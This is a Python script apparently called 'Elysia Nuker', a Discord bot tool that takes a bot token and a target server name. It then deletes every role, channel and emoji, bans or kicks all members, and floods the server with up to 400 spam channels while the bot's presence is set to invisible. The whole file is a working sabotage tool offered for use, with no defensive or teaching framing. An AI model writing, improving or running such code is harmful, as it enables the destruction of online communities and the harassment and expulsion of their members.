from colorama import Fore,Back,Style
from colorama import init
init()
import os
import time
import discord
import asyncio
import pyfiglet
from discord.ext import commands
from utils import *
import pyautogui

elysia_banner = pyfiglet.figlet_format('   ELYSIA   NUKER', font = 'slant')
print(Fore.LIGHTMAGENTA_EX,elysia_banner)

print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————1 - NUKE———————————————————————————|''')                    
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')                
print(Fore.LIGHTMAGENTA_EX + '''                  |——————2 - KICK ALL MEMBERS———————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————3 - BAN ALL MEMBERS————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————4 - DELETE ALL CHANNELS————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————5 - DELETE ALL ROLES———————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————6 - SPAM CHANNELLS—————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————7 - DELETE ALL EMOJIS——————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |——————8 - LISTEN TO CHAT—————————————————|''')
print(Fore.LIGHTMAGENTA_EX + '''                  |—————————————————————————————————————————|''')
print('\n')

print(Fore.MAGENTA + '                  WHAT DO YOU WANT ?')
action = int(input('                  >'))
os.system('cls')


print(Fore.LIGHTMAGENTA_EX,elysia_banner)

print(Fore.MAGENTA + '                  WHAT IS SERVER NAME ?')
server = input('                  >')
os.system('cls')

print(Fore.LIGHTMAGENTA_EX,elysia_banner)

print(Fore.MAGENTA + '                  WHAT IS BOT TOKEN ?')
token = input('                  >')
os.system('cls')

print(Fore.LIGHTMAGENTA_EX,elysia_banner)

print(Fore.MAGENTA + '                  WHAT IS CHANNEL SPAM ?')
channelspam = input('                  >')
os.system('cls')

n = 0 
for i in (range(101)) :

    print(' \ ' ,n)

    time.sleep(0.001)

    os.system('cls')

    print(' | ' ,n)

    time.sleep(0.001)

    os.system('cls')

    print(' / ' ,n)

    time.sleep(0.001)

    os.system('cls')

    print(' — ' ,n)
        
    time.sleep(0.001)

    os.system('cls')

    n += 1

client = discord.Client()

@client.event

async def on_ready () :

    print(Fore.MAGENTA + f'Logged as = {client.user} ( id = {client.user.id})')

    time.sleep(1)

    await client.change_presence (status = discord.Status.invisible)

    for guild in client.guilds :

        if server == guild.name :

            print(Fore.MAGENTA+f'Target ==> {guild.name}')

            time.sleep(1)

            os.system('cls')

            print(Fore.MAGENTA + 'Starting ...')

            time.sleep(1)

            os.system('cls')

            a = 0

            if action == 1 :

                print(Fore.MAGENTA + 'ROLE REMOVE PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for role in guild.roles :

                    try : 

                        await role.delete() 

                        print(f'Successfully removed ({role})')

                    except :

                        print(f'Can not removed ({role})')

                os.system('cls')

                print(Fore.MAGENTA + 'CHANNEL DELETION PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for channel in guild.channels :

                    try : 
                        
                        await channel.delete()

                        print(f'Successfully removed ({channel})')

                    except : 

                        print(f'Can not removed ({channel})')

                os.system('cls')

                print(Fore.MAGENTA + 'SPAM CHANNEL CREATION PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for i in range(25) :

                    try : 

                        await guild.create_text_channel(channelspam)

                        print('Successfully created')

                    except : 

                        print('Can not created')

                os.system('cls')

                print(Fore.MAGENTA + 'EMOJI DELETION PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for emoji in guild.emojis :

                    try : 

                        await emoji.delete()

                        print(f'Successfully removed ({emoji})')

                    except :

                        print(f'Can not removed ({emoji})')

                os.system('cls')

                print(Fore.MAGENTA + 'BAN PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for member in guild.members :

                    try :

                        await member.ban()

                        print(f'Successfully banned ({member})')

                    except :

                        print(f'Can not banned ({member})')

                os.system('cls')

                print(Fore.MAGENTA + 'NUKE IS OVER')

            if action == 2 :

                print(Fore.MAGENTA + 'KICK PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for member in guild.members :

                    try : 

                        await member.kick()

                        print(f'Successfully kicked ({member})')

                    except :

                        print(f'Can not Kicked ({member})')
                
                os.system('cls')

                print(Fore.MAGENTA + 'KICK PHASE IS OVER')

            if action == 3 :

                print(Fore.MAGENTA + 'BAN PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for member in guild.members :

                    try : 

                        await member.ban()

                        print(f'Successfully banned ({member})')

                    except :

                        print(f'Can not banned ({member})')
                
                os.system('cls')

                print(Fore.MAGENTA + 'BAN PHASE IS OVER')

            if action == 4 :

                print(Fore.MAGENTA + 'CHANNEL DELETION PHASE IS BEGINS')

                time.sleep(1)

                os.system('cls')

                for channel in guild.channels :

                    try : 

                        await channel.delete()

                        print(f'Successfully removed ({channel})')

                        a += 1

                    except :

                        print(f'Can not removed ({channel})')
                
                os.system('cls')

                print(Fore.MAGENTA + f'CHANNEL DELETION PHASE IS OVER , {a} CHANNEL DELETED SUCCESFULLY')

            if action == 5 :

                print(Fore.MAGENTA + 'ROLE DELETIONS PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for role in guild.roles :

                    try : 

                        await role.delete()

                        print(f'Successfully removed ({role})')

                    except :

                        print(f'Can not removed ({role})')
                
                os.system('cls')

                print(Fore.MAGENTA + 'ROLE DELETION PHASE IS OVER')

            if action == 6 :

                print(Fore.MAGENTA + 'SPAM CHANNEL CREATION PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for i in range(400) :

                    try : 

                        await guild.create_text_channel(channelspam)

                        print(f'Successfully created')

                    except :

                        print(f'Can not created')
                
                os.system('cls')

                print(Fore.MAGENTA + 'SPAM CHANNEL CREATION IS OVER')

            if action == 7 :

                print(Fore.MAGENTA + 'EMOJI DELETION PHASE BEGINS')

                time.sleep(1)

                os.system('cls')

                for emoji in guild.emojis :

                    try : 

                        await emoji.delete()

                        print(f'Successfully removed({emoji})')

                    except :

                        print(f'Can not removed({emoji})')
                
                os.system('cls')

                print(Fore.MAGENTA + 'EMOJI DELETION PHASE IS OVER')

            if action == 8 :

                print(Fore.MAGENTA + 'UNDER CONSTRUCTION')
                
client.run(token)